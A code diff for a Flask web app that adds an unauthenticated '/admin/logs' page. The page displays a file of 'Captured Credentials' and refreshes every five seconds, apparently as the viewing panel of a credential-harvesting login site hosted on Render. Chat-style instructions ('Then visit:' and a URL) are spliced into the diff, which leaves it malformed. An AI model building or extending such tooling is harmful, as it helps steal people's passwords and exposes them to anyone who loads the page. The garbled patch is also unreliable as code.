@@ -169,6 +169,65 @@ def api_register():
     
     return jsonify({'message': 'User registered successfully', 'user_id': new_user.id}), 201
 
+
+@app.route('/admin/logs')
+def admin_logs():
+    """View credential logs via web interface"""
+    try:
+        with open('credentials_log.txt', 'r') as f:
+            logs = f.read()
+    except FileNotFoundError:
+        logs = "No logs yet. Try logging in first!"
+    
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin - Credential Logs</title>
+        <meta http-equiv="refresh" content="5">
+        <style>
+            body {{
+                font-family: 'Courier New', monospace;
+                background: #0a0e27;
+                color: #00ff00;
+                padding: 20px;
+                margin: 0;
+            }}
+            h1 {{
+                color: #00ff00;
+                text-shadow: 0 0 10px #00ff00;
+                text-align: center;
+            }}
+            pre {{
+                background: #000;
+                padding: 20px;
+                border-radius: 8px;
+                border: 2px solid #00ff00;
+                overflow-x: auto;
+                white-space: pre-wrap;
+                word-wrap: break-word;
+            }}
+            .refresh {{
+                text-align: center;
+                color: #ffd700;
+                margin: 10px 0;
+            }}
+        </style>
+    </head>
+    <body>
+        <h1>🔐 Captured Credentials</h1>
+        <div class="refresh">⟳ Auto-refreshing every 5 seconds</div>
+        <pre>{logs}</pre>
+    </body>
+    </html>
+    """
+    return html
+```
+
+**Then visit:**
+```
+https://your-app.onrender.com/admin/logs
+
 @app.route('/api/login', methods=['POST'])
 def api_login():
     """API endpoint for login"""
